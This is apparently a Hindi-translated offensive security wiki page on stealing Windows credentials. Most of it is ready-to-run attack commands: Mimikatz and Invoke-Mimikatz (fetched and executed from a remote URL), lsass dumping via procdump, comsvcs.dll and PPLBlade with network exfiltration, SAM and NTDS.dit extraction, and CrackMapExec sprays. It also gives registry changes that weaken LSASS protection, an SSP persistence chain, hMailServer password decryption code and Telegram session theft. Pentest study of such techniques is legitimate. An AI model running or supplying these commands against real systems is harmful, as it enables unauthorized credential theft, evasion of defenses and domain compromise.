# Windows Credentials चुराना

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz से Credentials

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatz और क्या-क्या कर सकता है, यह** [**इस पेज पर**](credentials-mimikatz.md)** देखें।**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**कुछ संभावित credentials protections के बारे में यहाँ जानें।**](credentials-protections.md) **ये protections Mimikatz को कुछ credentials निकालने से रोक सकती हैं।**

## Meterpreter में Credentials

पीड़ित सिस्टम में **passwords और hashes खोजने** के लिए मेरे बनाए [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) का **उपयोग करें**।

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV को bypass करना

### Procdump + Mimikatz

क्योंकि [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) का **Procdump एक वैध Microsoft टूल है**, इसलिए Defender इसे detect नहीं करता।\
आप इस टूल का इस्तेमाल **lsass process को dump करने**, **dump डाउनलोड करने** और उसमें से **credentials को स्थानीय रूप से extract करने** के लिए कर सकते हैं।

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी इस्तेमाल कर सकते हैं।

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

यह प्रक्रिया [SprayKatz](https://github.com/aas-n/spraykatz) से स्वचालित रूप से की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: कुछ **AV**, **lsass.exe को dump करने के लिए procdump.exe के उपयोग** को **malicious** के रूप में **detect** कर सकते हैं, क्योंकि वे **"procdump.exe" और "lsass.exe"** strings को **detect** कर रहे होते हैं। इसलिए, **procdump** को **lsass.exe के नाम के बजाय** lsass.exe का **PID** एक **argument** के रूप में **pass** करना अधिक **stealthy** है।

### **comsvcs.dll** से lsass को dump करना

`C:\Windows\System32` में मिली **comsvcs.dll** नाम की DLL, crash होने की स्थिति में **process memory dump करने** के लिए ज़िम्मेदार है। इस DLL में **`MiniDumpW`** नाम का एक **function** शामिल है, जिसे `rundll32.exe` का उपयोग करके invoke करने के लिए डिज़ाइन किया गया है।\
पहले दो arguments का उपयोग करना अप्रासंगिक है, लेकिन तीसरा argument तीन हिस्सों में बँटा होता है। Dump किए जाने वाले process का ID पहला हिस्सा होता है, dump file का स्थान दूसरा, और तीसरा हिस्सा केवल **full** शब्द होता है। इसके कोई अन्य विकल्प नहीं हैं।\
इन तीन हिस्सों को parse करने के बाद, DLL dump file बनाने और निर्दिष्ट process की memory को उसमें स्थानांतरित करने का काम करती है।\
**comsvcs.dll** का उपयोग lsass process को dump करने के लिए किया जा सकता है, जिससे procdump को upload और execute करने की ज़रूरत नहीं पड़ती। इस method का विस्तार से वर्णन [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) पर किया गया है।<sup>[[9]](#references)</sup>

Execution के लिए निम्न command का उपयोग किया जाता है:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**आप इस प्रक्रिया को** [**lssasy**](https://github.com/Hackndo/lsassy)** से automate कर सकते हैं।**

### **Task Manager से lsass dump करना**

1. Task Bar पर right-click करें और Task Manager पर click करें
2. More details पर click करें
3. Processes tab में "Local Security Authority Process" process खोजें
4. "Local Security Authority Process" process पर right-click करें और "Create dump file" पर click करें।

### procdump से lsass dump करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft द्वारा signed binary है, जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite का हिस्सा है।

पहले से मौजूद full-system crash dump या किसी accessible user folder में उसकी compressed copy में offline analysis के लिए credential material मौजूद हो सकता है। `MEMORY.DMP` और `MEMORY.7z` जैसे filenames केवल जाँच के संकेत हैं: उनकी provenance और access verify करें, और यह न मानें कि उनमें उपयोगी या मौजूदा credentials मौजूद हैं।

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## VM snapshots से offline credentials extraction

एक readable VM backup में saved **guest memory image** हो सकती है, भले ही running guest या LSASS का access न हो। VMware के लिए, `.vmsn` snapshot metadata और मौजूद होने पर उससे जुड़ी `.vmem` फ़ाइल पहचानें; इनमें से किसी को भी `.vmdk` disk image न समझें। `VMkatz` snapshot या VM-directory inputs को parse कर सकता है और guest memory से [Windows logon-session credentials](credentials-mimikatz.md), जैसे hashes और tickets, recover कर सकता है। यह virtual disks में SAM/LSA material भी inspect कर सकता है। Backup files का access होना ज़रूरी है, live VM पर debug rights होना नहीं।<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Checkpoint के उदाहरण में एक standalone VM snapshot से **स्थानीय** Administrator NT hash रिकवर किया गया था। अलग से password reuse सत्यापित होने के बाद ही उससे domain पर authenticate किया जा सका; backup से मिला local hash अपने-आप में domain credential नहीं होता। कम memory वाले host पर VMkatz pages को क्रमशः scan और release कर सकता है, लेकिन snapshot को बड़े analysis host पर कॉपी करना फिर भी बेहतर हो सकता है।<sup>[[17]](#references)[[18]](#references)</sup>

## PPLBlade के साथ lsass Dumping

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है, जो memory dump को obfuscate करने और उसे disk पर डाले बिना remote workstations पर transfer करने का समर्थन करता है।

**मुख्य कार्यक्षमताएँ**:

1. PPL protection को bypass करना
2. Defender के signature-based detection mechanisms से बचने के लिए memory dump files को obfuscate करना
3. fileless dump के लिए, memory dump को disk पर डाले बिना RAW और SMB upload methods से upload करना

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump के बिना SSP-based LSASS dumping

Ink Dragon तीन चरणों वाला **LalsDumper** नाम का dumper इस्तेमाल करता है, जो कभी भी `MiniDumpWriteDump` को call नहीं करता, इसलिए उस API पर EDR hooks कभी fire नहीं होते:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में 32 lowercase `d` characters वाले placeholder को खोजता है, उसे `rtu.txt` के absolute path से overwrite करता है, patched DLL को `nfdp.dll` के रूप में save करता है, और `AddSecurityPackageA("nfdp","fdp")` call करता है। इससे **LSASS** malicious DLL को नए Security Support Provider (SSP) के रूप में load करता है।
2. **LSASS के अंदर Stage 2** – LSASS के `nfdp.dll` load करने पर, DLL `rtu.txt` पढ़ता है, हर byte को `0x20` से XOR करता है, और execution transfer करने से पहले decoded blob को memory में map करता है।
3. **Stage 3 dumper** – mapped payload, hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) से resolve किए गए **direct syscalls** का उपयोग करके MiniDump logic को फिर से implement करता है। `Tom` नाम का dedicated export `%TEMP%\<pid>.ddt` को open करता है, compressed LSASS dump को file में लिखता है, और handle बंद कर देता है ताकि बाद में exfiltration हो सके।

Operator के लिए नोट्स:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, और `rtu.txt` को एक ही directory में रखें। Stage 1 hard-coded placeholder को `rtu.txt` के absolute path से rewrite करता है, इसलिए इन्हें अलग-अलग रखने से chain टूट जाती है।
* Registration, `nfdp` को `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में append करके होती है। हर boot पर LSASS से SSP दोबारा load करवाने के लिए आप खुद यह value जोड़ सकते हैं।
* `%TEMP%\*.ddt` files compressed dumps होती हैं। इन्हें स्थानीय रूप से decompress करें, फिर credential extraction के लिए Mimikatz/Volatility को दें।
* `lals.exe` चलाने के लिए admin/SeTcb rights ज़रूरी हैं, ताकि `AddSecurityPackageA` सफल हो; call के return होते ही, LSASS rogue SSP को transparently load करके Stage 2 execute करता है।
* DLL को disk से हटाने पर वह LSASS से evict नहीं होता। या तो registry entry delete करके LSASS restart करें (reboot), या long-term persistence के लिए उसे वहीं रहने दें।

## CrackMapExec

### SAM hashes dump करें

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA secrets डंप करना

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### लक्ष्य DC से NTDS.dit Dump करें

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### target DC से NTDS.dit का पासवर्ड इतिहास Dump करें

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### प्रत्येक NTDS.dit खाते के लिए pwdLastSet attribute दिखाएँ

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM चुराना

ये फ़ाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_ में **स्थित** होनी चाहिए। लेकिन **आप इन्हें सामान्य तरीके से कॉपी नहीं कर सकते**, क्योंकि ये सुरक्षित हैं।

### Registry से

इन फ़ाइलों को चुराने का सबसे आसान तरीका Registry से उनकी कॉपी प्राप्त करना है:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**डाउनलोड** उन फ़ाइलों को अपनी Kali मशीन पर और इस कमांड से **hashes निकालें**:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

आप इस service का उपयोग करके protected files की copy बना सकते हैं। इसके लिए आपको Administrator होना चाहिए।

#### Using vssadmin

vssadmin binary केवल Windows Server versions में उपलब्ध है.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

लेकिन आप यही काम **Powershell** से भी कर सकते हैं। **SAM file कॉपी करने का तरीका** यह है (इस्तेमाल की गई hard drive "C:" है और फ़ाइल C:\users\Public में सेव की गई है), लेकिन आप इसका इस्तेमाल किसी भी सुरक्षित फ़ाइल को कॉपी करने के लिए कर सकते हैं:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

किताब का कोड: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

अंत में, आप SAM, SYSTEM और ntds.dit की कॉपी बनाने के लिए [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का भी उपयोग कर सकते हैं।

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory क्रेडेंशियल - NTDS.dit**

**NTDS.dit** फ़ाइल को **Active Directory** का हृदय माना जाता है। इसमें उपयोगकर्ता ऑब्जेक्ट, समूह और उनकी सदस्यताओं से जुड़ा महत्वपूर्ण डेटा होता है। डोमेन उपयोगकर्ताओं के **पासवर्ड हैश** इसी में संग्रहीत होते हैं। यह फ़ाइल **Extensible Storage Engine (ESE)** डेटाबेस है और **_%SystemRoom%/NTDS/ntds.dit_** में रहती है।

इस डेटाबेस में तीन मुख्य टेबल होती हैं:

- **Data Table**: यह टेबल उपयोगकर्ताओं और समूहों जैसे ऑब्जेक्ट का विवरण संग्रहीत करती है।
- **Link Table**: यह समूह सदस्यताओं जैसे संबंधों का रिकॉर्ड रखती है।
- **SD Table**: हर ऑब्जेक्ट के **Security descriptors** यहाँ रखे जाते हैं, जो संग्रहीत ऑब्जेक्ट की सुरक्षा और एक्सेस कंट्रोल सुनिश्चित करते हैं।

Christoffer Andersson का database-layer शोध इन टेबलों और उनके version-specific व्यवहार का अधिक विस्तार से दस्तावेज़ीकरण करता है।<sup>[[8]](#references)</sup>

Windows इस फ़ाइल के साथ इंटरैक्ट करने के लिए _Ntdsa.dll_ का उपयोग करता है, और इसका उपयोग _lsass.exe_ करता है। इसलिए, **NTDS.dit** फ़ाइल का **कुछ हिस्सा `lsass`** की मेमोरी में मौजूद हो सकता है (संभवतः **cache** के उपयोग से बेहतर performance के लिए, हाल ही में एक्सेस किया गया डेटा यहाँ मिल सकता है)।

#### NTDS.dit के अंदर मौजूद हैश को डिक्रिप्ट करना

हैश को तीन बार एन्क्रिप्ट किया जाता है:

1. **BOOTKEY** और **RC4** का उपयोग करके Password Encryption Key (**PEK**) को डिक्रिप्ट करें।
2. **PEK** और **RC4** का उपयोग करके **हैश** को डिक्रिप्ट करें।
3. **DES** का उपयोग करके **हैश** को डिक्रिप्ट करें।

**PEK** का मान हर domain controller पर **एक जैसा** होता है, लेकिन यह **NTDS.dit** के अंदर उस domain controller के **SYSTEM** hive से मिले DC-specific **BOOTKEY** की मदद से **एन्क्रिप्ट** किया जाता है। इसलिए, क्रेडेंशियल निकालने के लिए **NTDS.dit** और **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) दोनों की आवश्यकता होती है।

एक अलग [kernel handle-table redirection technique](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) VSS के बिना पहले से खुला NTDS file object कॉपी कर सकती है, लेकिन इसके लिए domain controller पर arbitrary kernel read/write primitive की आवश्यकता होती है।<sup>[[16]](#references)</sup>

### Ntdsutil का उपयोग करके NTDS.dit कॉपी करना

Windows Server 2008 से उपलब्ध।

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

आप **ntds.dit** फ़ाइल कॉपी करने के लिए [**volume shadow copy**](#stealing-sam-and-system) ट्रिक का भी उपयोग कर सकते हैं। याद रखें कि आपको **SYSTEM file** की एक कॉपी भी चाहिए होगी (इसे [**registry से dump करें या volume shadow copy**](#stealing-sam-and-system) ट्रिक का उपयोग करें)।

### **NTDS.dit से hashes निकालना**

एक बार जब आप **NTDS.dit** और **SYSTEM** फ़ाइलें **प्राप्त** कर लें, तो hashes **निकालने** के लिए _secretsdump.py_ जैसे टूल का उपयोग कर सकते हैं:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

आप एक वैध domain admin user का उपयोग करके इन्हें **स्वचालित रूप से extract** भी कर सकते हैं:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**बड़ी NTDS.dit फ़ाइलों** के लिए, इसे [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके extract करने की सिफ़ारिश की जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से domain objects को SQLite database में extract करना**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) से NTDS objects को SQLite database में extract किया जा सकता है। केवल secrets ही नहीं, बल्कि आगे की जानकारी निकालने के लिए पूरे objects और उनके attributes भी extract किए जाते हैं, जब raw NTDS.dit फ़ाइल पहले से प्राप्त हो चुकी हो।

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive वैकल्पिक है, लेकिन यह secrets decryption (NT और LM hashes, cleartext passwords जैसे supplemental credentials, kerberos या trust keys, NT और LM password histories) की अनुमति देता है। अन्य जानकारी के साथ, निम्न डेटा निकाला जाता है: users और machine accounts तथा उनके hashes, UAC flags, last logon और password change के timestamps, accounts के descriptions, names, UPN, SPN, groups और recursive memberships, organizational units का tree और membership, trust type, direction और attributes वाले trusted domains...

## Lazagne

[यहाँ](https://github.com/AlessandroZ/LaZagne/releases) से binary डाउनलोड करें। आप इस binary का उपयोग कई software से credentials निकालने के लिए कर सकते हैं।

```
lazagne.exe all
```

## SAM और LSASS से credentials निकालने के अन्य tools

### Windows credentials Editor (WCE)

इस tool का उपयोग memory से credentials निकालने के लिए किया जा सकता है। इसे यहाँ से download करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file से credentials निकालें

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM file से credentials निकालें

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

इसे यहाँ से डाउनलोड करें:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस **इसे execute करें**; पासवर्ड extract हो जाएंगे।

## निष्क्रिय RDP sessions की जानकारी जुटाना और security controls को कमजोर करना

Ink Dragon के FinalDraft RAT में `DumpRDPHistory` tasker शामिल है, जिसकी techniques किसी भी red-teamer के काम आ सकती हैं:<sup>[[3]](#references)</sup>

### DumpRDPHistory-शैली में telemetry संग्रह

* **आउटबाउंड RDP लक्ष्य** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर हर user hive को parse करें। हर subkey में server का नाम, `UsernameHint` और पिछली बार write किए जाने का timestamp होता है। आप PowerShell से FinalDraft के logic को दोहरा सकते हैं:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Inbound RDP के साक्ष्य** – यह पता लगाने के लिए कि बॉक्स को किसने प्रशासित किया, `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` लॉग में Event IDs **21** (सफल लॉगऑन) और **25** (डिस्कनेक्ट) क्वेरी करें:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

जब आपको पता चल जाए कि कौन-सा Domain Admin नियमित रूप से कनेक्ट करता है, तो उनका **disconnected** session मौजूद रहते हुए LSASS dump करें (LalsDumper/Mimikatz के साथ)। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें फिर SMB/WinRM पर replay करके `NTDS.dit` हासिल किया जा सकता है या domain controllers पर persistence स्थापित की जा सकती है।

### FinalDraft द्वारा लक्षित Registry downgrades

वही implant credential theft को आसान बनाने के लिए कई registry keys के साथ भी छेड़छाड़ करता है:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` inbound RDP के लिए Restricted Admin को disable करता है; यह उस mode के ज़रिए pass-the-hash को enable **नहीं** करता। Value को `0` पर सेट करने से destination पर Restricted Admin की अनुमति मिलती है, लेकिन client को `/RestrictedAdmin` अनुरोध करना होगा या ऐसी policy का उपयोग करना होगा जिसके लिए Restricted Admin आवश्यक हो।<sup>[[14]](#references)</sup> केवल hash से remote administrator अधिकार नहीं मिलते; [RDP authentication prerequisites](../../network-services-pentesting/pentesting-rdp.md) देखें।<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को disable करता है, जिससे local admins को network पर unrestricted tokens मिलते हैं।
* `DSRMAdminLogonBehavior=2` DSRM administrator को DC online होने पर log on करने देता है, जिससे attackers को एक और built-in high-privilege account मिलता है।
* `RunAsPPL=0` LSASS PPL protections हटा देता है, जिससे LalsDumper जैसे dumpers के लिए memory access आसान हो जाता है।

## hMailServer configuration credentials (compromise के बाद)

Installation layout के अनुसार, सटीक configuration files `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, और `C:\ProgramData\hMailServer\hMailServer.ini` जाँचें। पढ़ने योग्य, nonempty `[Security] AdministratorPassword=` value, hMailServer administration password hash है; यह Windows Administrator password का प्रमाण नहीं है। यदि यह credential मिल जाए, तो किसी भी Windows-account pivot के लिए password reuse और logon rights की स्वतंत्र रूप से पुष्टि आवश्यक है।

SQL CE database का उपयोग करने वाले installations में, INI की अलग `[Database] Password=` value database को protect करती है। Legacy installations में यह value static key `THIS_KEY_IS_NOT_SECRET` और 4-byte word endianness swaps का उपयोग करके Blowfish-encrypted होती है। INI से hex string लेकर यह Python snippet उपयोग करें:<sup>[[2]](#references)</sup>

पहले पुष्टि करें कि मौजूदा account INI और उससे संबंधित SQL CE `.sdf` database **दोनों** पढ़ सकता है। INI password database को protect करता है; यह उसके भीतर stored mailbox account hashes से अलग है। उपयोग में मौजूद database की जाँच या upgrade हमेशा उसकी **copy** पर करें, live file पर कभी नहीं।

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

क्लियर-टेक्स्ट पासवर्ड के साथ, फ़ाइल लॉक से बचने के लिए SQL CE database की कॉपी बनाएँ, 32-bit provider लोड करें, और hashes को query करने से पहले ज़रूरत पड़ने पर upgrade करें:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

The `accountpassword` कॉलम hMailServer hash format (`hashcat` mode `1421`) का उपयोग करता है। Cracked mailbox password से Windows user pivot तभी बनता है, जब वही password किसी local/domain account द्वारा फिर से इस्तेमाल किया गया हो और उस account के पास आवश्यक remote-logon rights हों।

## LSA Logon Callback Interception (LsaApLogonUserEx2)

कुछ tooling, LSA logon callback `LsaApLogonUserEx2` को intercept करके **plaintext logon passwords** capture करती है। इसमें authentication package callback को hook या wrap किया जाता है, ताकि credentials को **logon के दौरान** (hash होने से पहले) capture करके disk पर लिखा जा सके या operator को लौटाया जा सके। इसे आम तौर पर ऐसे helper के रूप में implement किया जाता है जो LSA में inject या उसके साथ register होता है, और फिर हर सफल interactive/network logon event के साथ username, domain और password रिकॉर्ड करता है।<sup>[[1]](#references)</sup>

Operational notes:
- Authentication path में helper load करने के लिए local admin/SYSTEM की आवश्यकता होती है।
- Captured credentials केवल logon होने पर ही दिखाई देते हैं (hook के अनुसार interactive, RDP, service या network logon)।

## SSMS में सेव किए गए कनेक्शन credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), सेव की गई कनेक्शन जानकारी को हर user की `sqlstudio.bin` फ़ाइल में स्टोर करता है। Dedicated dumpers इस फ़ाइल को parse करके सेव किए गए SQL credentials recover कर सकते हैं। ऐसे shells में जो केवल command output लौटाते हैं, इस फ़ाइल को अक्सर Base64 में encode करके stdout पर प्रिंट किया जाता है।<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

ऑपरेटर की ओर, credentials recover करने के लिए फ़ाइल को फिर से build करें और dumper को local रूप से चलाएँ:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol के ज़रिए browser session और cookie चोरी

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop `tdata` session चोरी

Telegram Desktop authorization और account state को अपनी **`tdata`** directory में रखता है। कॉपी किए गए session को compatible tooling से लोड करके account password के बिना authenticate किया जा सकता है, जब तक वह authorization मान्य हो; अगर local-data encryption सक्षम है, तो stealer को passcode की भी ज़रूरत होती है। इसके बाद authenticated session से identity data, dialog और membership metadata, messages और डाउनलोड करने योग्य media तक पहुँचा जा सकता है।<sup>[[10]](#references)</sup>

### खोज और प्राप्ति

Installed और portable, दोनों layouts में खोजें; Microsoft Store package के नाम अलग-अलग हो सकते हैं, इसलिए `TelegramMessenge` वाली package directories की सूची बनाएँ और उनके `LocalCache\Roaming` subtree की जाँच करें।<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

यदि सामान्य read विफल हों और process token में `SeBackupPrivilege` **पहले से मौजूद और enabled** हो, तो backup-aware access एक fallback देता है; इससे privilege प्राप्त नहीं होता और न ही process elevate होता है। `FILE_FLAG_BACKUP_SEMANTICS` के साथ `CreateFileW` backup/restore semantics का अनुरोध कर सकता है और आवश्यक token privileges मौजूद होने पर file security checks को bypass कर सकता है, लेकिन केवल यह flag किसी असंगत sharing lock को bypass नहीं करता।<sup>[[10]](#references)[[11]](#references)</sup>

Live locked files के लिए **Volume Shadow Copy** बनाएं/पढ़ें; ACL-blocked files के लिए, `robocopy /B` backup mode इस्तेमाल करता है और file तथा directory ACLs को bypass करता है।<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

एक bandwidth-conscious implant पहले केवल file-path inventory भेज सकता है, C2 में पहले से stored paths के साथ snapshot identifier प्राप्त कर सकता है, और केवल missing files upload कर सकता है। इसलिए, recursive `tdata` enumeration के बाद होने वाले छोटे incremental transfers भी session theft की सफलता का संकेत हो सकते हैं।<sup>[[10]](#references)</sup>

### Detection and containment

